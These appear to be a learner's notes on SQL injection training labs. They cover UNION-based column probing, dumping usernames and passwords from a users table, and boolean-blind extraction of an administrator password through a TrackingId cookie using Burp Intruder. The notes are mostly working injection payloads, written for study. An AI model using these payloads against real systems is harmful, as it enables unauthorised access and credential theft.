1. Make the database retrieve the string: 'tWGj2h'; Find the column containing string
2. Retrieve data from other tables. Find users table and look for administrator password. 
3. Retreive multiple values in a single column. 
4. Blind SQL injection with conditional responses. Find injection vector, conditional response will respond true or false. 




1.
'--;Validate injection location
' ORDER BY 3--; validate column quanitity
' UNION SELECT NULL,'tWGj2h',NULL --; This was the answer and the second column is the number visually. Which would make you think non-string. Don't think you know things!
The second column of the query would actually show up in the first location which looked like words or strings. 

2.
category=' UNION SELECT username,password from users --%20
We couldn't find out the database on this one. Well not simply by quering to find DB and then tables. Simply queried username,password from users.

3. 
We are presented with a page that is one column of data. 
It is easy to skip steps when certain things don't work or you don't expect them. 
Oracle:
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--;  Browser and Works from repeater which is after browser
' UNION SELECT NULL, username||'~'||password FROM users--; Browser   Only Browser. URL has to get encoded by browser.
You had to know string was second column and not the first. Lesson always generate a good select not with NULL if you are grabbing data. 
Microsot / MYSQL:
CONCAT ( string_value1, string_value2 [, string_valueN ] )

So, when we inject anything into the get request URL nothing comes back but the welcome back. The clue here was the welcome back and the trackin id was the injection vector. 
Cookie: TrackingId=aaaaaaaaaaaaaaaa' and '1'='2; session=aaaaaaaaaaaaaaaaaaaaaaaaa     This gave us no welcome back
Cookie: TrackingId=aaaaaaaaaaaaaaaa' and '1'='1; session=aaaaaaaaaaaaaaaaaaaaaaaaa     This provided welcome back we have our injection vector. 
Cookie: TrackingId=aaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM users LIMIT 1)='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa   Provides welcome back, verifies table
Cookie: TrackingId=aaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM notusers LIMIT 1)='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  Provides no welcome back, nerifies no table
TrackingId=aaaaaaaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM users WHERE username='administrator')='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  Welcome back, admin is there. 
TrackingId=aaaaaaaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  Welcome back, passowrd is > 1. May use intruder to guess
TrackingId=aaaaaaaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  Welcome back, passowrd is = 20
So, we know length and we know how to test if conditions are true, we now need to test is each charachter is true. Only Lower alpha to reserve time. 
Note:
For more advanced users, the solution described here could be made more elegant in various ways. For example, instead of iterating over every character, 
you could perform a binary search of the character space. Or you could create a single Intruder attack with two payload positions and the "Cluster bomb" attack type,
and work through all permutations of offsets and character values. 
Beginner: This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
Put payload into intuder, "Clear §" button. 
"Clear §" button. 
Cookie: TrackingId=aaaaaaaaaaaa' AND (SELECT (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a;
  High light a and select add §    You a then becomes §a§
  payloads, Type Brute Force.
  options, grep match Welcome back  don't use quotes as you might on linux
  Cookie: TrackingId=ACyfdDO0lU6oWNyk'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username%3d'administrator')%3d'§a§'--;
  Watched Michael Sommer who didn't use URL encoing must be using a BURP config to do that. 
  
  Now with Cluster Bomb attack to get it done with one and done:
  Attack Type in Intruder main page is Cluster bomb. Iterates through them both like a for in a for. 
    Ensure you have both Add S and the first one is the first payload, iterates first payload 1-20 with a, then 1-20 with b.
